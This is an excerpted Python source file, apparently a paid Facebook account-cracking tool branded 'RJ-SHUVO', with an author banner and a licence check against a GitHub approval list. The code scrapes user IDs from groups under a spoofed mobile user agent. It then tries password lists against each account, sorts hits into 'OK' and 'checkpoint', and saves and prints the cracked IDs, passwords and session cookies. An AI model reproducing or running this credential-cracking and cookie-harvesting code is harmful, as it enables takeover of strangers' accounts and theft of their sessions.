...
def banner():
	clear()
	sol()
	ban=''' © MASTER MIND RJ BRAND
	
   _____ __  ____  ___    ______ 
  / ___// / / / / / / |  / / __ \    RJ Shuvo
  \__ \/ /_/ / / / /| | / / / / /    WHATSAPP:01950908973
 ___/ / __  / /_/ / | |/ / /_/ /   GITHUB:RJ-Shuvo
/____/_/ /_/\____/  |___/\____/ Dont Forget Allah                                 '''
...
def chk():
  ...
  id = "|".join(uuid)
  print("\n\n\x1b[37;1m  YOUR ID : \033[94m"SHUVO+id) 
  try: 
    httpCaht = requests.get("https://github.com/RJ-Shuvo/Publice_Cloner/blob/main/approved.txt").text 
    if id in httpCaht: 
      ...
      print("\033[0;96m YOUR ID IS NOT ACTIVE COPY † AND SEND ME MESSAGE ON WHATSAPP OR MESSENGER \033[0;91m#NOT FREE!!!") 
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('=>Choose the Right Example ')
				exit()
...
def lah():
	print("\r"+balmond+m+" \x1b[1;95Total ID Collected :\x1b[1;97m "+str(len(id))+"                     ")
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \x1b[1;94mIF YOU NO RESULT Airplane Mode 5 Seconds")
	print(balmond+m+" \x1b[1;94Collecting ID")
	print(balmond+m+" \x1b[1;94Press CTRL + C To Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}=>Choose the Right Crack {u}')
			time.sleep(3)
			back()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}RJ-SHUVO-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ RJ-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ RJ-OK ❤️✨[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      😭HELLO THIS RJ BRAND 🤣[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/RJ-SHUVO/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/RJ-SHUVO/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='RJ-SHUVO OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RJ-SHUVO OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='RJ-XD CP'))
					open('/sdcard/RJ-SHUVO/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]R-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
...
def ceker(idf,pw):
	...
	try:
		...
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Chek Login In Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Chek Login In Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> SHUVO       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
